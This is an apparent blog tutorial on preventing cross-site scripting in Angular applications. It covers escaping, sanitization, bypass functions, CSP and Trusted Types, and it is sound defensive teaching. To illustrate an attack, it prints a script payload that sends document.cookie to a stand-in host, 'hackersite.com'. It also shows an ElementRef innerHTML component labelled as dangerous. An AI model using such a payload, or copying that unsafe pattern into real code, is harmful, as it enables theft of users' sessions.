---
title: Angular XSS prevention 🔐 Modern best practices
author: Christoph Jürgens
avatar: christoph-juergens.jpg
description: Learn Angular XSS modern best practices and methods to prevent cross-site scripting attacks in Angular (JavaScript) applications. 🔒
date: 2021-11-27
tags: [Angular, Security]
---
{% image_fw 1.78 banner.png "Preventing XSS in Angular" %}

Besides the application's primary purpose, one of the most critical aspects is protecting the sensitive data of its users. Today's client-side applications are often publicly available and connected to the cloud, increasing vulnerabilities to security threats and breaches.

Cross-Site Scripting (XSS) is probably one of the most common and most dangerous attack vectors on front-end applications and web pages. An XSS vulnerability can lead to an attacker taking complete control of the web application and can give access to cookies, session tokens, or other sensitive information like passwords or credit card details. Furthermore, a successful attacker could make authenticated requests to the webserver on behalf of the user or modify the application's HTML code.

In short, once an attacker achieves exploiting an XSS vulnerability, it mostly means _game over_. The whole web app can be considered entirely compromised. When it comes to XSS attacks, the victim is the user and not the application.

<!-- toc -->

Luckily most modern front-end frameworks like Angular come with built-in defense mechanisms against XSS. However, that does not mean your application is automatically perfectly secure.

This article aims to review how XSS prevention in Angular works in detail and avoid possible pitfalls. We will also look beyond the box and briefly touch on further steps to even better protect our Angular applications.

{% img "cookies.png" "Prevent potential XSS attacks in Angular" "lazy" %}

## How does a Cross-Site Scripting attack work (in a nutshell)?

Like all injection attacks, the lack of context between code and data is the fundamental reason for Cross-Site Scripting. An attacker injects malicious code into the web application, which the browser interprets as a legit script instead of data. This scenario causes the attacker's arbitrary code to be executed in the user's web browser (through client-side languages, usually JavaScript or HTML), resulting in a fully compromised web page or SPA.

The following example demonstrates a common scenario of XSS. Let's assume your website uses a search function to find all search-term related posts or products. On the result page, the following heading will be displayed when a user searches for 'cats':

``` html A typical DOM-XSS exposure
<h1>Search results for <b>cats</b>:</h1>
```

But what would happen if a user enters the following piece of code into the search field?

``` typescript Simplified code snippet of the XSS attack
<script>
  alert("I am stealing your cookies!")
  window.location="http://hackersite.com/?cookie" + document.cookie;
</script>
```

If a user enters this code snippet, the browser adds it to the heading of the result page and automatically runs the script. The alert message appears, and the user's cookies get sent to the hacker's website. The example is just an illustration of the principle; in real-world attacks, the attacker tricks the user into running more advanced code.

### XSS in OWASP Top Ten 2021

In the last decade, cross-site scripting was always one of the top security risks listed in the OWASP Top 10 (#3 in 2013 and #7 in 2017).

By 2021, they are now a part of the injection group, as XSS is a specific type of injection. The combined category (including SQL injection) remains one of the most vulnerable security issues in web applications, listed in place 3. OWASP states that 94% of the tested applications suffer from some form of injection vulnerability.

{% img "xss.jpg" "Preventing XSS in Angular" "lazy" %}

## How do I make my Angular app secure?

As mentioned above, Angular ships with powerful built-in defense mechanisms to protect your web application against XSS. By design, Angular treats all user data entering the application as **untrusted**. We must ensure that no malicious code can be entered into our application's DOM (Document Object Model) by an attacker.

> **To systematically block XSS bugs, Angular treats all values as untrusted by default.**

### Angular's auto-escaping defense mechanism

The best defense mechanism for blocking XSS attacks is ensuring that the web browser never misinterprets data as code. Angular archives this by auto-escaping all data bindings that rely on interpolation. By sanitizing and escaping untrusted values, all data gets transformed into safe values before being inserted into the HTML file.

When an untrusted value gets inserted into the DOM by interpolation (using double curly brackets like `{{ var }}`), Angular is automatically aware of the potential risk. It applies its encoding mechanism to ensure that the untrusted value cannot cause any danger. Potentially dangerous characters like angle brackets get converted to their respective HTML or URL encoded equivalents. The user's browser renders the attacker's code as data, which does not get executed anymore.

### Angular and dynamic HTML code

Angular applications in production often require rendering HTML dynamically. Typical examples would be WYSIWYG editors in Content Management Systems, comment sections under blog posts, or product reviews on eCommerce sites.

Rich text editors (like [Froala](https://froala.com/wysiwyg-editor/), [CKEditor](https://ckeditor.com/), or WordPress' Gutenberg Editor) create HTML output that needs to be inserted into your application, then parsed and rendered as HTML by the browser.

Angular's interpolation would classify all input as untrusted and therefore escape all HTML tags. This would not be the desired outcome, as all HTML tags would be printed onto the screen as text content.

In this case, we need to bind the HTML creation to Angular's `[innerHtml]`; this ensures that the input will be interpreted as HTML. By data binding with the innerHtml property, Angular recognizes critical data as unsafe and automatically sanitizes it to remove untrusted values. Please note the square brackets around the innerHTML property: they indicate that it belongs to Angular and is not a native DOM API innerHTML property.

In short, Angular's built-in sanitizer prevents malicious code from being executed by removing potentially unsafe attributes like `<script>` but keeps safe content such as the `<p>` or `<section>` element. Its automatic sanitization works very intelligently: it identifies the context and reacts accordingly. A harmless value in CSS stays untouched; however, the same value could potentially be dangerous in a URL and therefore gets sanitized.

### What is better, escaping or sanitizing malicious code?

When Angular escapes untrusted values, specific strings are encoded with their HTML entities and displayed in the DOM. The browser interprets the data as text and not code anymore. A `<script>` tag, for example, will be displayed but not be rendered as JavaScript code.

On the other hand, the sanitize method removes potentially dangerous elements, such as `<script>` or the `href` attribute of an `<a>` tag. It makes sure to eliminate all unsafe elements so that only safe HTML is left. This may sound like filtering, but the way Angular sanitizes data works differently: Its built-in HTML sanitizer uses predefined safe values (e.g. a valid HTML element) and marks everything else as unsafe.

The main difference between interpolated and innerHTML code is the behaviour of data interpreted. Property binding helps us bind values to an HTML element's target property but use interpolation to show any data in the template like strings, numbers, dates, arrays, etc. Angular will sanitize and escape untrusted values for you.

{% banner_ad "wsf_bundle.gif" "https://courses.dev-academy.com/p/web-security-fundamentals" %}

## Possible Angular XSS pitfalls

So, you don't have to worry about malicious code? Well, as long as you, as the developer, follow the described **Angular way of dealing with values**, the framework does a fantastic job protecting your application from an XSS attack. However, there are still a few things to keep in mind to avoid shooting yourself in the foot:

### Do not access DOM elements directly

Accessing HTML elements directly in the DOM is strongly discouraged; use Angular's template mechanisms to manipulate the DOM instead. Native web APIs won't receive the built-in Angular protection, leading to a security vulnerability. Especially avoid any document object methods to interact with the HTML file.

``` typescript Avoid direct DOM manipulation
// Do not use methods like:
document.getElementById("myHeading").innerHTML = "Hello World!";
document.getElementById("myLogo").src = "logo.jpg";
document.getElementById("myList").appendChild(node);
```

Most applications don't require interacting with HTML elements directly, but if you find yourself in this rare situation, Angular offers its own APIs (for example, the ElementRef API). Only a small percentage of applications really requires this low-level access, so first, make sure if you really can't use templates instead. But be aware, if you are not careful, even Angular's special APIs can quickly lead to XSS vulnerabilities when used to gain access to a direct DOM node and perform manipulations, as shown in this code example:

``` typescript Don't use ElementRef to manipulate native DOM elements
@Component({
  selector: 'dangerous',
  template: '<h1 #myHeading></h1>',
  styleUrls: ['./dangerous.component.scss']
})
export class DangerousComponent {
  @ViewChild("myHeading") heading: ElementRef;
  
  setHeading(headingValue: string) {
    this.heading.nativeElement.innerHTML = headingValue;
  }
}
```

Undoubtedly, it is highly recommended to avoid the above pattern as it bypasses Angular's XSS prevention functionalities. Use common Angular ways to access view elements and input values safely.

### Stay away from bypassing user input

Angular offers a way to mark input as trusted manually by using the _DomSanitizer_ and using its **byPassSecurityTrust...()** functions. As the name suggests, these functions completely bypass Angular's XSS protection, so be extremely careful when using them. If you are not 100% sure what you are doing or somebody might be able to control the input, you could introduce potential XSS vulnerabilities.

Angular's DomSanitizer offers following bypass security functions for trustworthy inputs:

* `byPassSecurityTrustHtml()`
* `byPassSecurityTrustStyle()`
* `byPassSecurityTrustScript()`
* `byPassSecurityTrustUrl()`
* `byPassSecurityTrustResourceUrl()`

When misused, these functions can be **extremely dangerous**. The only tolerable use case for them would be to output a static piece of data or code, something you have written yourself.

### Be careful with server-side template rendering

A regular Angular application runs in the browser, rendering pages in the DOM in response to user actions. With the help of server-side rendering (SSR), the application executes on the server, generating static pages which get sent and bootstrapped on the client. The advantages are better performance and easier indexing for search engines.

When using Angular Universal, the prerendered code is the same as the Angular code running in the browser. This is great because it means that Angular protects our application the same way out of the box.

However, avoid using other 3rd party template engines like Handlebars, Pug, etc., for your Angular application. Implementing these template engines could lead to potentially dangerous code injected into the template. The data injected is external and out of the scope of Angular's security features, leading to a high risk of introducing template-injection vulnerabilities.

### XSS vulnerabilities through open-source dependencies

You, as the developer, do not have to reinvent the wheel repeatedly when it comes to adding more functionalities to your app. The Angular community provides a rich ecosystem of plugins to solve nearly every possible task, which is very handy. But blindly integrating these pieces of software may introduce security vulnerabilities to your Angular application. Any 3rd party Angular module with known vulnerabilities becomes a threat that can impact the security of your entire project.

Please do not underestimate the risk; some attackers look for vulnerabilities in these components, which they can then use to orchestrate XSS attacks.

Unfortunately, using modules containing vulnerabilities becomes more and more widespread! In the current [OWASP Top 10 of 2021](https://owasp.org/www-project-top-ten/), the threat category "Vulnerable and Outdated Components" jumped from #9 to #6 compared to 2017.

So even if you follow Angular's security best practices, the authors of the plugin you are using may not, which can leave your application exposed to severe risks. An excellent first step to mitigate this threat is to scan your project using _npm audit_. The commands _npm audit_ and _npm audit fix_ will help you find and resolve known vulnerabilities in your Angular application.

## More XSS vulnerabilities prevention

But wait, there is more! Keep in mind, even the most minor XSS bug in your code could lead to a compromised web application. As seen in this article, Angular uses superb built-in defense mechanisms to mitigate vulnerabilities out-of-the-box but doesn't lull into a false sense of immunity of potential XSS vulnerabilities.

Adding additional layers of security can harden your front-end application immensely. Especially HTTP headers can help you to increase the security of your web application even more. Two powerful concepts are to enable Content Security Policy and to enforce Trusted Types.

Below is a brief overview of these two concepts; I will elaborate on the nitty-gritty in future articles and link them here.

### Content Security Policy (CSP)

The Content Security Policy is a web standard that can mitigate the risk of XSS. The Content-Security-Policy HTTP headers constrain a modern browser viewing your application to only download resources from trusted sources. A resource can be a script, a stylesheet, an image, or some other type of file. When having CSP settings in place and configured correctly, your application only executes code from resource URLs you trust.

### Trusted Types

Enforcing Trusted Types is another excellent way to help you minimize the risk of XSS attacks to protect sensitive data. This feature enables the obligation of safer coding practices and allows you to simplify your application code and systematically block cross-site scripting bugs.

Trusted Types might not be available in all modern browsers yet. When writing this article, Firefox marks the Trusted Types policies as experimental. However, Chrome has supported this feature since version 83, released in May 2020, and MS Edge since version 95, released in October 2021.

## Angular XSS best practices

Angular offers secure defaults to render user-provided data into HTML pages. Its zero-trust approach protects your application from XSS attacks if the developer follows Angular's best practices.

These are the most important takeaways from this article:

1. Use Angular's interpolation whenever possible
2. Use `[innerHtml]` with caution, only if you need to render user-generated HTML
3. Don't use native DOM APIs to interact with HTML elements
4. Never use 3rd party template engines on server-side templates
5. Scan your application with _npm audit_
6. If possible, use Content Security Policy and Trusted Types

So, if you follow Angular's coding patterns, your website will be secure from XXS attacks. Additionally, don't forget always to make sure to keep up with the latest releases. The Angular team might fix possible security defects discovered in previous versions. Also, never modify Angular core files. If you think you might have found some flaws, share your improvements with the community and make a pull request on [GitHub](https://github.com/angular).

This article was written by [Christoph Jürgens](https://www.linkedin.com/in/christoph-juergens-54a20311/). Christoph is a software engineer and technical lead with a soft spot for web security. He is particularly interested in working with cutting-edge technologies to create clean, well-designed code for building high-quality applications.
